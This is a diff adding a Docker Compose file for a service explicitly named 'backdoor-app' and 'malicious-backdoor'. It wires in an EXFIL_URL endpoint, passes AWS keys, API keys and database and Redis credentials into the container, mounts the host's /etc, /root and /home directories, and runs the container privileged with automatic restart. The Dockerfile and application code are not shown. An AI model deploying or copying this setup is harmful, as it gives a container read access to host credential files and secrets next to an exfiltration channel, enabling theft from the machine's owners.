@@ -1,0 +1,30 @@
+version: '3.8'
+
+services:
+  backdoor-app:
+    build:
+      context: .
+      dockerfile: Dockerfile
+      args:
+        EXFIL_URL: ${EXFIL_URL}
+    container_name: malicious-backdoor
+    ports:
+      - "3000:3000"
+      - "5000:5000"
+      - "8080:8080"
+    environment:
+      - NODE_ENV=production
+      - EXFIL_URL=${EXFIL_URL}
+      - SECRET_KEY=${SECRET_KEY:-default-secret-key}
+      - API_KEY=${API_KEY:-default-api-key}
+      - DATABASE_URL=${DATABASE_URL:-postgres://user:pass@localhost/db}
+      - AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY_ID}
+      - AWS_SECRET_ACCESS_KEY=${AWS_SECRET_ACCESS_KEY}
+      - REDIS_PASSWORD=${REDIS_PASSWORD}
+    volumes:
+      - /etc:/host-etc:ro
+      - /root:/host-root:ro
+      - /home:/host-home:ro
+    restart: unless-stopped
+    privileged: true
+
